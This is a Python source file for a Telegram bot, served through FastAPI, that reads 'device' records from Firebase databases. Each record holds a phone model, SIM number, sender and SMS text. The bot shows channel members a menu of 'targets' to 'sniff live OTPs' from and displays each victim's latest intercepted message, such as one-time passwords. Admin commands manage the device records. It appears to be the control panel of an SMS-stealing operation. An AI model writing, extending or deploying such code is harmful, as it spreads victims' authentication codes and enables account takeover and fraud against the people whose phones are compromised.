import os
import logging
import json
import base64
from fastapi import FastAPI, Request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler
from dotenv import load_dotenv
import firebase_admin
from firebase_admin import credentials, db

load_dotenv()

BOT_TOKEN = os.getenv('BOT_TOKEN')
CHANNEL_USERNAME = os.getenv('CHANNEL_USERNAME', 'RSPANNEL')
ADMIN_IDS = os.getenv('ADMIN_IDS', '').split(',')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

ADD_DEVICE = 1
_active_db_name = None

# ============ FIREBASE ============
_firebase_apps = {}

def init_firebase_database(db_name, db_url, cred_base64):
    try:
        if db_name in _firebase_apps:
            return _firebase_apps[db_name]
        cred_json = base64.b64decode(cred_base64).decode('utf-8')
        cred_dict = json.loads(cred_json)
        cred = credentials.Certificate(cred_dict)
        app = firebase_admin.initialize_app(cred, {'databaseURL': db_url}, name=db_name)
        _firebase_apps[db_name] = app
        return app
    except Exception as e:
        logger.error(f"Firebase init fail {db_name}: {e}")
        return None

def get_all_databases():
    dbs = {}
    for key, val in os.environ.items():
        if key.startswith('FIREBASE_DB_') and key.endswith('_NAME'):
            idx = key.replace('FIREBASE_DB_', '').replace('_NAME', '')
            name = val
            url_key = f'FIREBASE_DB_{idx}_URL'
            cred_key = f'FIREBASE_DB_{idx}_CRED'
            if url_key in os.environ and cred_key in os.environ:
                if os.environ[cred_key] and 'PASTE' not in os.environ[cred_key]:
                    dbs[name] = {'url': os.environ[url_key], 'cred': os.environ[cred_key]}
    return dbs

def get_active_db():
    global _active_db_name
    if not _active_db_name:
        _active_db_name = os.getenv('ACTIVE_DATABASE', 'myapp')
    return _active_db_name

def set_active_db(name):
    global _active_db_name
    _active_db_name = name
    return True

def get_devices(db_name=None):
    if not db_name:
        db_name = get_active_db()
    dbs = get_all_databases()
    if db_name not in dbs:
        return {}
    app = init_firebase_database(db_name, dbs[db_name]['url'], dbs[db_name]['cred'])
    if not app:
        return {}
    try:
        ref = db.reference('devices', app=app)
        return ref.get() or {}
    except:
        return {}

def get_device_by_id(device_id, db_name=None):
    if not db_name:
        db_name = get_active_db()
    dbs = get_all_databases()
    if db_name not in dbs:
        return None
    app = init_firebase_database(db_name, dbs[db_name]['url'], dbs[db_name]['cred'])
    if not app:
        return None
    try:
        ref = db.reference(f'devices/{device_id}', app=app)
        return ref.get()
    except:
        return None

def add_device_to_db(device_id, device_data, db_name=None):
    if not db_name:
        db_name = get_active_db()
    dbs = get_all_databases()
    if db_name not in dbs:
        return False
    app = init_firebase_database(db_name, dbs[db_name]['url'], dbs[db_name]['cred'])
    if not app:
        return False
    try:
        ref = db.reference(f'devices/{device_id}', app=app)
        ref.set(device_data)
        return True
    except:
        return False

def delete_device_from_db(device_id, db_name=None):
    if not db_name:
        db_name = get_active_db()
    dbs = get_all_databases()
    if db_name not in dbs:
        return False
    app = init_firebase_database(db_name, dbs[db_name]['url'], dbs[db_name]['cred'])
    if not app:
        return False
    try:
        ref = db.reference(f'devices/{device_id}', app=app)
        ref.delete()
        return True
    except:
        return False

def get_online_devices(db_name=None):
    devices = get_devices(db_name)
    online = {}
    for did, data in devices.items():
        if data.get('sim') and len(str(data.get('sim', '')).strip()) > 0:
            online[did] = data
    return online

def get_offline_devices(db_name=None):
    devices = get_devices(db_name)
    offline = {}
    for did, data in devices.items():
        if not data.get('sim') or len(str(data.get('sim', '')).strip()) == 0:
            offline[did] = data
    return offline

def get_device_count(db_name=None):
    devices = get_devices(db_name)
    total = len(devices)
    online = 0
    offline = 0
    for data in devices.values():
        if data.get('sim') and len(str(data.get('sim', '')).strip()) > 0:
            online += 1
        else:
            offline += 1
    return {'total': total, 'online': online, 'offline': offline}

# ============ HELPERS ============
def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

def format_sms_display(device_data, device_id, db_name):
    sim = str(device_data.get('sim', 'N/A'))
    model = device_data.get('model', 'Unknown')
    from_id = device_data.get('from', 'Unknown')
    time = device_data.get('time', 'Unknown')
    message = device_data.get('message', 'No message')
    return f"""
🔴 *Locking on Target... Fetching details.*
{time}

*📩 CURRENT LATEST SMS*

• *From:* `{from_id}`
  *Model:* {model}
  *SIM:* `{sim}` | SIM -1
  *Time:* {time}

*📝 Message:*
{message}

*🆔 ID:* `{device_id}`
*📡 Database:* `{db_name}`

{time}

*📡 Live Sniffer Activated for {model}*
Stay tuned! 🎉
"""

# ============ CHANNEL CHECK ============
async def is_user_in_channel(context, user_id):
    try:
        member = await context.bot.get_chat_member(f'@{CHANNEL_USERNAME}', user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ============ USER COMMANDS ============
async def start(update: Update, context):
    user_id = update.effective_user.id
    if not await is_user_in_channel(context, user_id):
        await update.message.reply_text(
            f"👋 Welcome!\n\n⚠️ Please join @{CHANNEL_USERNAME} first, then /start again."
        )
        return
    
    db_name = get_active_db()
    devices = get_online_devices(db_name)
    targets = []
    idx = 1
    for did, data in devices.items():
        if idx > 70:
            break
        targets.append({'id': did, 'number': idx})
        idx += 1
    
    if not targets:
        await update.message.reply_text("⚠️ No active targets.")
        return
    
    keyboard = []
    row = []
    for t in targets:
        row.append(InlineKeyboardButton(f"Target {t['number']}", callback_data=f"target_{t['id']}"))
        if len(row) == 5:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    await update.message.reply_text(
        f"🔴 *{len(targets)} Unique Targets Online!*\nSelect a target to sniff live OTPs. 🔴",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    device_id = query.data.replace('target_', '')
    db_name = get_active_db()
    data = get_device_by_id(device_id, db_name)
    if not data:
        await query.edit_message_text("⚠️ Target offline.")
        return
    display = format_sms_display(data, device_id, db_name)
    await query.edit_message_text(display, parse_mode='Markdown')

async def help_command(update: Update, context):
    await update.message.reply_text("/start - Show targets\n/help - Help")

# ============ ADMIN COMMANDS ============
async def admin_panel(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    db_name = get_active_db()
    stats = get_device_count(db_name)
    dbs = list(get_all_databases().keys())
    db_list = "\n".join([f"• `{d}` {'✅' if d == db_name else ''}" for d in dbs])
    await update.message.reply_text(
        f"🔐 *Admin Panel*\n\n📊 Total: {stats['total']} | 🟢{stats['online']} | 🔴{stats['offline']}\n🗄️ Active: `{db_name}`\n\n📋 Available:\n{db_list}\n\nCommands:\n/admin /databases /switch <name> /add /list /online /offline /toggle <id> <sim> /delete <id> /stats",
        parse_mode='Markdown'
    )

async def list_databases(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    db_name = get_active_db()
    dbs = get_all_databases()
    msg = "🗄️ *Databases*\n\n"
    for name in dbs.keys():
        stats = get_device_count(name)
        msg += f"{'✅' if name == db_name else '⬜'} `{name}` - Total:{stats['total']} 🟢{stats['online']} 🔴{stats['offline']}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def switch_database(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /switch <name>")
        return
    name = args[0]
    dbs = get_all_databases()
    if name not in dbs:
        await update.message.reply_text(f"❌ {name} not found. Available: {', '.join(dbs.keys())}")
        return
    set_active_db(name)
    await update.message.reply_text(f"✅ Switched to `{name}`")

async def admin_list(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    db_name = get_active_db()
    devices = get_devices(db_name)
    if not devices:
        await update.message.reply_text("📭 No devices.")
        return
    msg = f"📋 *All Devices* - `{db_name}`\n\n"
    idx = 1
    for did, data in devices.items():
        status = "🟢" if data.get('sim') else "🔴"
        msg += f"{idx}. {status} `{did}` - {data.get('model', 'Unknown')}\n"
        idx += 1
        if len(msg) > 3000:
            await update.message.reply_text(msg, parse_mode='Markdown')
            msg = ""
    if msg:
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_online(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    db_name = get_active_db()
    devices = get_online_devices(db_name)
    if not devices:
        await update.message.reply_text("🟢 No online devices.")
        return
    msg = f"🟢 *Online* - `{db_name}`\n\n"
    idx = 1
    for did, data in devices.items():
        msg += f"{idx}. `{did}` - {data.get('model')} | SIM: `{data.get('sim')}`\n"
        idx += 1
        if len(msg) > 3000:
            await update.message.reply_text(msg, parse_mode='Markdown')
            msg = ""
    if msg:
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_offline(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    db_name = get_active_db()
    devices = get_offline_devices(db_name)
    if not devices:
        await update.message.reply_text("🔴 No offline devices.")
        return
    msg = f"🔴 *Offline* - `{db_name}`\n\n"
    idx = 1
    for did, data in devices.items():
        msg += f"{idx}. `{did}` - {data.get('model')}\n"
        idx += 1
        if len(msg) > 3000:
            await update.message.reply_text(msg, parse_mode='Markdown')
            msg = ""
    if msg:
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_stats(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    db_name = get_active_db()
    stats = get_device_count(db_name)
    await update.message.reply_text(f"📊 *Stats* - `{db_name}`\n\nTotal: {stats['total']}\n🟢 Online: {stats['online']}\n🔴 Offline: {stats['offline']}", parse_mode='Markdown')

async def toggle_device(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /toggle <id> <sim> or /toggle <id> off")
        return
    did, sim = args[0], args[1]
    db_name = get_active_db()
    data = get_device_by_id(did, db_name)
    if not data:
        await update.message.reply_text(f"❌ {did} not found.")
        return
    data['sim'] = '' if sim.lower() == 'off' else sim
    if add_device_to_db(did, data, db_name):
        await update.message.reply_text(f"✅ Updated `{did}` - SIM: `{data['sim']}`", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ Failed.")

async def delete_device(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /delete <id>")
        return
    did = args[0]
    db_name = get_active_db()
    if delete_device_from_db(did, db_name):
        await update.message.reply_text(f"✅ Deleted `{did}` from `{db_name}`", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ Failed.")

# ============ ADD DEVICE CONVERSATION ============
async def add_device_start(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    await update.message.reply_text(
        "✏️ Send: `ID|Model|From|Time|Message`\nExample: `d141e9390d148857|motorola edge 50 pro|TM-WowCat-S|2026-05-20 04:55:09|Your OTP: 930655`\nType /cancel to abort.",
        parse_mode='Markdown'
    )
    return ADD_DEVICE

async def add_device_receive(update: Update, context):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    text = update.message.text
    if text == '/cancel':
        await update.message.reply_text("❌ Cancelled.")
        return ConversationHandler.END
    parts = text.split('|')
    if len(parts) < 5:
        await update.message.reply_text("❌ Invalid. Use: ID|Model|From|Time|Message")
        return ADD_DEVICE
    did = parts[0].strip()
    data = {
        'model': parts[1].strip(),
        'from': parts[2].strip(),
        'time': parts[3].strip(),
        'message': parts[4].strip(),
        'sim': ''
    }
    db_name = get_active_db()
    if add_device_to_db(did, data, db_name):
        await update.message.reply_text(f"✅ Added `{did}` to `{db_name}`\nUse /toggle to add SIM.", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ Failed.")
    return ConversationHandler.END

async def cancel(update: Update, context):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============ BUILD TELEGRAM APP ============
def build_telegram_app():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("databases", list_databases))
    app.add_handler(CommandHandler("switch", switch_database))
    app.add_handler(CommandHandler("list", admin_list))
    app.add_handler(CommandHandler("online", admin_online))
    app.add_handler(CommandHandler("offline", admin_offline))
    app.add_handler(CommandHandler("toggle", toggle_device))
    app.add_handler(CommandHandler("delete", delete_device))
    app.add_handler(CommandHandler("stats", admin_stats))
    
    conv = ConversationHandler(
        entry_points=[CommandHandler("add", add_device_start)],
        states={ADD_DEVICE: [CommandHandler("add", add_device_receive), CommandHandler("cancel", cancel)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(button_callback, pattern="^target_"))
    return app

# ============ FASTAPI APP FOR VERCEL ============
telegram_app = build_telegram_app()
fastapi_app = FastAPI()

@fastapi_app.post("/")
@fastapi_app.post("/{path:path}")
async def handle_webhook(request: Request):
    try:
        body = await request.json()
        update = Update.de_json(body, telegram_app.bot)
        await telegram_app.process_update(update)
        return Response(status_code=200)
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return Response(status_code=200)

# Vercel entrypoint
app = fastapi_app

# ============ LOCAL TESTING ============
if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
